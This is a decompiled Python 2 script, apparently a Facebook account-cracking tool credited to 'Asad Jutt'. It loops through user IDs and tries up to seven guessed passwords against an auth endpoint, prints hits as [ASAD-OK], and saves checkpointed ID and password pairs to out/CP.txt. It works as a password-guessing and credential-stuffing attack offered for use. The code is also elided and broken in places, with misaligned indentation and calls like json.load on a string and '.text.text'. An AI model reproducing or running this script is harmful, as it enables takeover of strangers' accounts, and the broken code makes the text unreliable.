#!/usr/bin/python2
#coding=utf-8
# Decompiled By Tech Baba
# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, jun 20 2021, 12:52:45) 
try:
    import os
    import sys
    import time
...
\033[1;92m
\033[1;93m-----------------------------------------------
\033[1;97m>> Author : Asad Jutt
\033[1;97m>> Github : https://github.com/*****
\033[1;97m>> WP NO: +923065893752
-----------------------------------------------"""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
...
def hop():
	...
	if hack =="":
		...
		super()
	        ...
	        os.system('xdg-open https://www.facebook.com/profile.php?id=100016563643273')
	        menu()
	...
	def main(arg):
		...
		try:
			...
			if 'access_token' in q:
				print '\033[1;92m[ASAD-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
				oks.append(uid+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\033[1;31;1m[ASAD-CP] ' + uid + ' | ' + pass1	
					...
					data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
		                        q = json.load(data)
					if 'access_token' in q:
						print '\033[1;92m[ASAD-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'	
						oks.append(uid+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\033[1;31;1m[ASAD-CP] ' + uid + ' | ' + pass2
							cek = open("out/CP.txt", "a")
							cek.write(uid+"|"+pass2+"\n")
							cek.close()
							...
							data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = header).text
		                                        q = json.load(data)
							if 'access_token' in q:
								print '\033[1;92m[ASAD-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
								oks.append(uid+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\033[1;31;1m[ASAD-CP] ' + uid + ' | ' + pass3	
									cek = open("out/CP.txt", "a")
									cek.write(uid+"|"+pass3+"\n")
									cek.close()
									...
									data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers = header).text
		                                                        q = json.load(data)
									if 'access_token' in q:
										print '\033[1;92m[ASAD-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'	
										oks.append(uid+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\033[1;31;1m[ASAD-CP] ' + uid + ' | ' + pass4
											cek = open("out/CP.txt", "a")
											cek.write(uid+"|"+pass4+"\n")
											cek.close()
											...
											data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers = header).text
		                                                                        q = json.load(data)
											if 'access_token' in q:
												print '\033[1;92m[ASAD-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
												oks.append(uid+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\033[1;31;1m[ASAD-CP] ' + uid + ' | ' + pass5	
													cek = open("out/CP.txt", "a")
													cek.write(uid+"|"+pass5+"\n")
													cek.close()
													...
													data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers = header).text
		                                                                                        q = json.load(data)
													if 'access_token' in q:
														print '\033[1;92m[ASAD-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
														oks.append(uid+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\033[1;31;1m[ASAD-CP] ' + uid + ' | ' + pass6	
															cek = open("out/CP.txt", "a")
															cek.write(uid+"|"+pass6+"\n")
															cek.close()
															...
															data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers = header).text.text
		                                                                                                        q = json.load(data)
															if 'access_token' in q:
																print '\033[1;92m[ASAD-OK] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
																oks.append(uid+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\033[1;31;1m[ASAD-CP] ' + uid + ' | ' + pass7
																	cek = open("out/CP.txt", "a")
                                                                                                                                        cek.write(uid+"|"+pass7+"\n")
																	cek.close()
